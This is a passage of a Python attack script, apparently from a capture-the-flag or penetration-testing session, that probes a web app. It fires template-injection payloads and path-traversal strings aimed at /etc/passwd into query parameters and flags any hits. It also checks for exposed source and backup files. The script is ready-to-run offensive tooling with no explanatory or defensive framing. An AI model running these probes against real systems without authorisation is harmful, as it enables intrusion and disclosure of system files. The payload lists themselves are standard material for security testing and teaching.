methods = re.findall(r'<form[^>]*method="([^"]*)"[^>]*>', page_resp.text, re.IGNORECASE)
print(f"[+] Form methods found: {methods}")

print("\n" + "=" * 60)
print("[+] Trying payloads that might reveal server-side data...")

# Try payloads that might trigger server-side errors/info disclosure
payloads = [
    "${7*7}",
    "{{7*7}}",
    "<%= 7*7 %>",
    "#{7*7}",
    "${{7*7}}",
    "<% 7*7 %>",
    "{7*7}",
    "#{7*7}",
]

for payload in payloads:
    for param in ['input', 'name']:
        url = f"{base_url}/page?{param}={urllib.parse.quote(payload)}"
        try:
            resp = requests.get(url)
            if '49' in resp.text:
                print(f"[!] SSTI DETECTED! Payload '{payload}' evaluated")
                break
        except:
            pass

print("\n[+] Testing for LFI/RFI...")
lfi_payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
]

for payload in lfi_payloads:
    for param in ['input', 'name', 'page', 'file']:
        url = f"{base_url}/page?{param}={urllib.parse.quote(payload)}"
        try:
            resp = requests.get(url)
            if 'root:' in resp.text or 'daemon:' in resp.text:
                print(f"[!] LFI DETECTED! param={param}, payload={payload}")
                print(f"Response: {resp.text[:500]}")
        except:
            pass

print("\n[+] Checking other common paths...")
other_paths = [
    "/source",
    "/source.py",
    "/app.py",
    "/server.py",
    "/main.py",
    "/index.py",
    "/static",
    "/uploads",
    "/files",
    "/backup",
    "/old",
]

for path in other_paths:
    try:
        url = f"{base_url}{path}"
        resp = requests.get(url)
        if resp.status_code in [200, 301, 302, 403]:
            print(f"[+] {path} - Status {resp.status_code}")
    except:
        pass

print("\n[+] Analysis complete.")

